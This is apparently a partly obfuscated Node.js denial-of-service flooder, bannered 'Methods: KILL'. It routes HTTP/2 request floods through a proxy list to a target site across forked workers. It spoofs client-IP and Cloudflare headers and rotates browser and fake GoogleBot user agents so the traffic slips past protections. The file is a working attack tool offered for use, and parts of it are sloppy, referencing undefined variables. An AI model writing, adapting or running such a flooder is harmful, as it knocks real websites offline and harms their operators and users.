const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"];
version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"", "\"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\""];
platform = ['Windows'];
site = ["cross-site", "same-origin", "same-site", "none"];
mode = ["cors", "navigate", "no-cors", "same-origin"];
dest = ["document", "image", 'embed', "empty", "frame"];
const rateHeaders = [{
  'akamai-origin-hop': randstr(0x5)
}, {
  'source-ip': randstr(0x5)
}, {
  'via': randstr(0x5)
}, {
  'cluster-ip': randstr(0x5)
}, {
  'Access-Control-Request-Method': "POST"
}, {
  'dnt': '1'
}];
const rateHeaders2 = [{
  'akamai-origin-hop': randstr(0x5)
}, {
  'source-ip': randstr(0x5)
}, {
  'via': randstr(0x5)
}, {
  'cluster-ip': randstr(0x5)
}];
const useragentl = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", "(NasaChecker)", '(CloudFlareIUAM)', "(NginxChecker)", "(AAPanel)", "(AntiLua)", '(FushLua)', "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  console.clear();
  console.log("╔═════╩════════════════════════════════════════════╩═════╗");
  console.log("\n╔══╦══╦══╦══╦═╦╦╗╔══╦╦╦═╦═╦═╦══╦══╦══╦╦╦╗\n║╔╗╠╗╔╩╗╔╣╔╗║╔╣╔╝║══╣║║╔╣╔╣╦╣══╣══╣═╦╣║║║\n║╠╣║║║─║║║╠╣║╚╣╚╗╠══║║║╚╣╚╣╩╬══╠══║╔╝║║║╚╗\n╚╝╚╝╚╝─╚╝╚╝╚╩═╩╩╝╚══╩═╩═╩═╩═╩══╩══╩╝─╚═╩═╝ \n  ");
  console.log("╔═════╩════════════════════════════════════════════╩═════╗");
  console.log("Target : " + process.argv[0x2]);
  console.log("Time   : " + process.argv[0x3]);
  console.log("Methods: KILL");
  console.log("User   : SukaLebok06");
  console.log("╔═════╩════════════════════════════════════════════╩═════╗");
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x29fa22, _0x2c3a50) {
    const _0x4ef1e3 = "CONNECT " + _0x29fa22.address + ":443 HTTP/1.1\r\nHost: " + _0x29fa22.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x3160a4 = new Buffer.from(_0x4ef1e3);
    const _0x1a98de = net.connect({
      'host': _0x29fa22.host,
      'port': _0x29fa22.port
    });
    _0x1a98de.setTimeout(_0x29fa22.timeout * 0x186a0);
    _0x1a98de.setKeepAlive(true, 0x186a0);
    _0x1a98de.on("connect", () => {
      _0x1a98de.write(_0x3160a4);
    });
    _0x1a98de.on('data', _0x5a1e84 => {
      const _0x3744b4 = _0x5a1e84.toString('utf-8');
      const _0x471dcd = _0x3744b4.includes("HTTP/1.1 200");
      if (_0x471dcd === false) {
        _0x1a98de.destroy();
        return _0x2c3a50(undefined, "error: invalid response from proxy server");
      }
      return _0x2c3a50(_0x1a98de, undefined);
    });
    _0x1a98de.on('timeout', () => {
      _0x1a98de.destroy();
      return _0x2c3a50(undefined, "error: timeout exceeded");
    });
    _0x1a98de.on("error", _0x30c4ec => {
      _0x1a98de.destroy();
      return _0x2c3a50(undefined, "error: " + _0x30c4ec);
    });
  }
}
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":method"] = "HEAD";
headers[":authority"] = parsedTarget.host;
headers[":authority"] = parsedTarget.host;
headers[':authority'] = parsedTarget.host + ":443";
headers.Via = "1.1 " + parsedTarget.host + ":443";
headers.Server = "cloudflare";
headers.Vary = "Accept-Encoding";
headers["Referrer-Policy"] = 'strict-origin-when-cross-origin';
headers['Strict-Transport-Security'] = "max-age=31536000; includeSubDomains; preload";
headers["X-Client-Source"] = "explorer";
headers['X-Content-Type-Options'] = "nosniff";
headers["X-Robots-Tag"] = "nofollow";
headers["Alt-Svc"] = "h3=\":443\"; ma=86400";
headers['Alt-Svc'] = "h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000";
headers["Accept-Encoding"] = "gzip, deflate, br";
headers['cache-control'] = "no-cache, no-store,private, max-age=300, must-revalidate";
headers["Content-Encoding"] = "gzip";
headers["Content-Type"] = "text/html; charset=utf-8";
headers["Content-Type"] = "text/html";
headers["Content-Type"] = 'application/json';
headers['Sec-Ch-Ua-Mobile'] = '?0';
headers["Sec-Ch-Ua-Platform"] = "Windows";
headers["Sec-Fetch-Dest"] = "document";
headers["Sec-Fetch-Mode"] = "navigate";
headers["Sec-Fetch-Site"] = "same-origin";
headers["Sec-Fetch-User"] = '?1';
headers["Upgrade-Insecure-Requests"] = '1';
headers.Allow = "GET";
headers['X-XSS-Protection'] = "1; mode=block";
headers["Accept-Patch"] = "application/example, text/example";
headers['Accept-Patch'] = 'text/example;charset=utf-8';
headers['Accept-Patch'] = 'application/merge-patch+json';
headers["Cross-Origin-Opener-Policy"] = "unsafe-none, same-origin-allow-popups, same-origin";
headers["Alt-Svc"] = "h2=\":443\"; ma=2592000";
headers["Alt-Svc"] = "h2=\":80\"; ma=2592000";
headers["x-forwarded-proto"] = "https";
headers[":scheme"] = "https";
headers[":path"] = parsedTarget.path;
headers.Server = 'support-content-u';
headers.Server = "cloudflare";
headers.accept = accept;
headers["accept-language"] = lang;
headers[":authority"] = parsedTarget.host;
headers.origin = parsedTarget.host;
headers["Content-Type"] = randomHeaders["Content-Type"];
headers[":scheme"] = 'https';
headers.Via = fakeIP;
headers.sss = fakeIP;
headers['Sec-Websocket-Key'] = fakeIP;
headers["Sec-Websocket-Version"] = 0xd;
headers.Upgrade = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["x-requested-with"] = "XMLHttpRequest";
headers["Max-Forwards"] = '10';
headers.pragma = "no-cache";
headers["user-agent"] = uap;
headers["User-Agent"] = uap;
headers['CF-Connecting-IP'] = fakeIP;
headers["CF-RAY"] = 'randomRayValue';
headers['CF-Visitor'] = "{'scheme':'https'}";
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-For"] = spoofed;
headers[":authority"] = parsedTarget.host;
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["cache-control"] = "max-age=0";
headers.vary = "Accept-Language";
headers["x-content-type-options"] = "nosniff";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
headers['accept-language'] = 'en-us,en;q=0.5';
headers['accept-encoding'] = 'gzip,deflate';
headers.range = "bytes=0-499";
headers.accept = accept;
headers.referer = Ref;
headers["X-Forwarded-For"] = spoofed;
headers['x-forwarded-proto'] = 'https';
headers[":scheme"] = 'https';
headers[":path"] = parsedTarget.path;
headers[":authority"] = parsedTarget.host;
headers.origin = parsedTarget.host;
headers[":scheme"] = 'https';
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"";
headers['sec-ch-ua-mobile'] = '?0';
headers["sec-ch-ua-platform"] = "Windows";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers['upgrade-insecure-requests'] = '1';
headers.accept = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(0x7);
headers.referer = Ref;
headers['sec-fetch-mode'] = "navigate";
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = '?1';
headers.TE = "trailers";
headers.Via = fakeIP;
headers.sss = fakeIP;
headers['Sec-Websocket-Key'] = fakeIP;
headers["Sec-Websocket-Version"] = 0xd;
headers.Upgrade = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers['Client-IP'] = fakeIP;
headers['Real-IP'] = fakeIP;
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers.GET = " / HTTP/2";
headers.GET = " / HTTP/1.1";
headers[":path"] = parsedTarget.path;
headers[':scheme'] = "https";
headers.Referer = "https://google.com";
headers.accept_header = xn;
headers["accept-language"] = badag;
headers['accept-encoding'] = enc;
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = "trailers";
headers["x-requested-with"] = 'XMLHttpRequest';
headers["Max-Forwards"] = '10';
headers.pragma = 'no-cache';
headers["Real-IP"] = spoofed;
headers.referer = Ref;
headers[":authority"] = parsedTarget.host + ':80';
headers.origin = "https://" + parsedTarget.host + ":80";
headers.Via = "1.1 " + parsedTarget.host + ':80';
headers[":authority"] = parsedTarget.host + ":443";
headers.origin = "https://" + parsedTarget.host + ":443";
headers.Via = "1.1 " + parsedTarget.host + ':443';
headers.push({
  'Alt-Svc': "http/1.1=" + parsedTarget.host + "; ma=7200"
});
headers.push({
  'Alt-Svc': 'http/1.2=' + parsedTarget.host + "; ma=7200"
});
headers.push({
  'Alt-Svc': "http/2=" + parsedTarget.host + "; ma=7200"
});
headers.push({
  'Alt-Svc': 'http/1.1=http2.' + parsedTarget.host + ":80; ma=7200"
});
headers.push({
  'Alt-Svc': 'http/1.2=http2.' + parsedTarget.host + ":80; ma=7200"
});
headers.push({
  'Alt-Svc': 'http/2=http2.' + parsedTarget.host + ":80; ma=7200"
});
headers.push({
  'Alt-Svc': 'http/1.1=' + parsedTarget.host + ":443; ma=7200"
});
headers.push({
  'Alt-Svc': "http/1.2=" + parsedTarget.host + ":443; ma=7200"
});
headers.push({
  'Alt-Svc': "http/2=" + parsedTarget.host + ":443; ma=7200"
});
headers[":authority"] = parsedTarget.host;
headers[':scheme'] = 'https';
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache";
headers["X-Forwarded-For"] = spoofed;
headers["sec-ch-ua"] = "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"";
headers["sec-ch-ua-mobile"] = '?0';
headers["sec-ch-ua-platform"] = 'Windows';
headers["accept-language"] = lang;
headers['accept-encoding'] = encoding;
headers["upgrade-insecure-requests"] = '1';
headers.accept = accept;
headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(0x7);
headers.referer = Ref;
headers['sec-fetch-mode'] = "navigate";
headers['sec-fetch-dest'] = dest1;
headers["sec-fetch-user"] = '?1';
headers.TE = "trailers";
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers["cf-cache-status"] = "BYPASS";
headers['cf-cache-status'] = "HIT";
headers["cf-cache-status"] = "DYNAMIC";
function runFlooder() {
  const _0x1ced3e = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x541688 = _0x1ced3e.split(':');
  headers.origin = "https://" + parsedTarget.host;
  headers.referer = "https://" + parsedTarget.host + parsedTarget.path;
  headers[":authority"] = parsedTarget.host;
  headers[':authority'] = parsedTarget.host + ":80";
  headers.Via = "1.1 " + parsedTarget.host + ":80";
  headers[":authority"] = parsedTarget.host + ':443';
  headers.origin = "https://" + parsedTarget.host + ":443";
  headers.Via = "1.1 " + parsedTarget.host + ":443";
  headers.Vary = "Accept-Encoding";
  headers["Referrer-Policy"] = 'strict-origin-when-cross-origin';
  headers['Content-Encoding'] = "gzip";
  headers['Accept-Encoding'] = "gzip, deflate, br";
  headers['Content-Type'] = "text/html";
  headers[":method"] = "GET";
  headers.Server = "support-content-u";
  headers.Server = 'cloudflare';
  headers["Cross-Origin-Opener-Policy"] = "unsafe-none, same-origin-allow-popups, same-origin";
  headers["Alt-Svc"] = "h2=\":443\"; ma=2592000";
  headers['Alt-Svc'] = "h2=\":80\"; ma=2592000";
  headers["cf-cache-status"] = "BYPASS";
  headers["cf-cache-status"] = "HIT";
  headers["cf-cache-status"] = "DYNAMIC";
  const _0x1f5928 = {
    'host': _0x541688[0x0],
    'port': ~~_0x541688[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x12c
  };
  Socker.HTTP(_0x1f5928, (_0x30d48f, _0x176556) => {
    if (_0x176556) {
      return;
    }
    _0x30d48f.setKeepAlive(true, 0x30d40);
    const _0x4db09c = {
      'secure': true,
      'ALPNProtocols': ['h2', "http/1.1", 'spdy/3.1', 'h3'],
      'sigals': siga,
      'socket': _0x30d48f,
      'ciphers': cipper,
      'ecdhCurve': 'prime256v1:X25519',
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': "TLS_method"
    };
    const _0x4f7b50 = tls.connect(0x1bb, parsedTarget.host, _0x4db09c);
    _0x4f7b50.setKeepAlive(true, 0xea60);
    const _0x3ad7fe = http2.connect(parsedTarget.href, {
      'protocol': 'https:',
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x2710,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x4f7b50,
      'socket': _0x30d48f
    });
    _0x3ad7fe.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x2710,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    setInterval(() => {
      _0x3ad7fe.on("connect", () => {
        const _0x1eb649 = {
          ...headers,
          ...rateHeaders2[Math.floor(Math.random() * rateHeaders.length)],
          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
        };
        for (let _0x245dd5 = 0x0; _0x245dd5 < args.Rate; _0x245dd5++) {
          const _0x202fb1 = _0x3ad7fe.request(_0x1eb649);
          _0x202fb1.on('response', _0x597093 => {
            _0x202fb1.close();
            _0x202fb1.destroy();
            return;
          });
          _0x202fb1.end();
        }
      });
    });
    _0x3ad7fe.on("close", () => {
      _0x3ad7fe.destroy();
      _0x30d48f.destroy();
      return;
    });
  });
  (function (_0x3a9a7a, _0x456615, _0x1f013f) {});
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);